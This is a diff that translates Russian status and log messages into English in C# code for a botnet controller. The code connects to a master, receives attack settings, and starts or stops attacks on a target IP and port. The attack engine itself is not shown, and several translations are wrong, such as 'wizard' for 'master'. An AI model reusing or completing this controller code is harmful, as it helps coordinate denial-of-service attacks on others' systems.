@@ -63,9 +63,9 @@ namespace Botnet
                 string status = "";
                 switch (state)
                 {
-                    case ControllerState.Attacking: status = "Атака"; break;
-                    case ControllerState.Suspending: status = "Ожидание"; break;
-                    default: status = "Ошибка"; break;
+                    case ControllerState.Attacking: status = "Attack"; break;
+                    case ControllerState.Suspending: status = "Expectation"; break;
+                    default: status = "Error"; break;
                 }
                 return ToString() + " " + status;
             }
@@ -243,7 +243,7 @@ namespace Botnet
             TcpClient Connection = Params as TcpClient;
             string key = ((IPEndPoint)(Connection.Client.RemoteEndPoint)).ToString();
             string hostname = Daemons[key].ToString();
-            UpdateData(hostname + " Присоединился");
+            UpdateData(hostname + " Joined");
             NetworkStream Stream = Connection.GetStream();
             Connection.ReceiveBufferSize = 1000;
             Connection.ReceiveTimeout = 200;
@@ -285,7 +285,7 @@ namespace Botnet
             {
                 return;
             }
-            UpdateData(hostname + " Отсоединился");
+            UpdateData(hostname + " Detached");
             Daemons.Remove(key);
         }
         /// <summary>
@@ -299,7 +299,7 @@ namespace Botnet
             {
                 Connection.Connect(Master);
                 if (state != ControllerState.Suspending) state = ControllerState.Suspending;
-                UpdateData("Соединение с мастером установлено");
+                UpdateData("Connection to the wizard is installed");
                 Connection.ReceiveBufferSize = 10000;
                 Connection.ReceiveTimeout = 100;
                 NetworkStream Stream = Connection.GetStream();
@@ -334,7 +334,7 @@ namespace Botnet
                                                 InitParams(AttackParams.parseFromArray(buffer));
                                                 state = ControllerState.Suspending;
                                                 DataCollected = true;
-                                                UpdateData("Получены настройки от мастера");
+                                                UpdateData("Received settings from the master");
                                             }
                                         }
 
@@ -364,7 +364,7 @@ namespace Botnet
                         }
                     }
                 }
-                UpdateData("Соединение с мастером разорвано");
+                UpdateData("Connection with the master is broken");
                 state = ControllerState.Error;
                 Stream.Close();
                 HostClient.Close();
@@ -372,7 +372,7 @@ namespace Botnet
             }
             catch (SocketException)
             {
-                UpdateData("Невозможно подключиться к мастеру"); //1060 exception
+                UpdateData("Unable to connect to master"); //1060 exception
                 state = ControllerState.Error;
             }
             catch (ObjectDisposedException)
@@ -563,7 +563,7 @@ namespace Botnet
             if ((al_port != CurrentPort) || (Adapter.Id != this.Adapter.Id) || ((MasterPoint != null) && (!MasterPoint.Equals(Master) || HostClient != null)) || ((MasterPoint == null) && (Master != null)))
             {
                 Close();
-                UpdateData("Инициализация клиентов");
+                UpdateData("Customer initialization");
                 try
                 {
                     CurrentPort = al_port;
@@ -588,11 +588,11 @@ namespace Botnet
                     state = ControllerState.Error;
                     if (err.SocketErrorCode == SocketError.AddressAlreadyInUse)
                     {
-                        UpdateData("Выбранный порт занят");
+                        UpdateData("Selected port is busy");
                     }
                     if (err.ErrorCode == (int)SocketError.AddressNotAvailable)
                     {
-                        UpdateData("Не найдено интерфейса с таким адресом");
+                        UpdateData("No interface found for this address");
                     }
                 }
                 catch (ObjectDisposedException) { return; }
@@ -606,7 +606,7 @@ namespace Botnet
         {
             if (state != ControllerState.Error)
             {
-                UpdateData("Применение параметров");
+                UpdateData("Applying Parameters");
                 if (state == ControllerState.Attacking)
                 {
                     Stop();
@@ -654,7 +654,7 @@ namespace Botnet
                     if (mode)
                     {
                         SendStartSignal();
-                        UpdateData("Начало атаки на " + Core.Params.Target.Address.ToString() + ":" + Core.Params.Target.Port);
+                        UpdateData("Start attack on " + Core.Params.Target.Address.ToString() + ":" + Core.Params.Target.Port);
                         Core.start();
                         state = ControllerState.Attacking;
                     }
@@ -663,16 +663,16 @@ namespace Botnet
                         if (AttackIsAllowed)
                         {
                             Core.start();
-                            UpdateData("Начало атаки на " + Core.Params.Target.Address.ToString() + ":" + Core.Params.Target.Port);
+                            UpdateData("Start attack on " + Core.Params.Target.Address.ToString() + ":" + Core.Params.Target.Port);
                             state = ControllerState.Attacking;
                         }
-                        else UpdateData("Атака еще не запущена мастером");
+                        else UpdateData("The attack is not yet started by the wizard");
                     }
 
                 }
                 else
                 {
-                    UpdateData("Атака уже запущена");
+                    UpdateData("Attack already started");
                 }
             }
             else
@@ -681,11 +681,11 @@ namespace Botnet
                 {
                     if (!mode)
                     {
-                        UpdateData("Отсутсвует подключение к мастеру");
+                        UpdateData("No connection to master");
                     }
                     else
                     {
-                        UpdateData("Выбранный порт занят");
+                        UpdateData("Selected port is busy");
                     }
                     //state = ControllerState.Error; 
                 }
@@ -700,7 +700,7 @@ namespace Botnet
             if (state == ControllerState.Attacking)
             {
                 Core.stop();
-                UpdateData("Остановка атаки...");
+                UpdateData("Stopping the attack ...");
                 if (mode)
                 {
                     SendStopSignal();
@@ -709,7 +709,7 @@ namespace Botnet
             }
             else
             {
-                UpdateData("Атака еще не запущена");
+                UpdateData("The attack has not yet started");
             }
         }
         /// <summary>
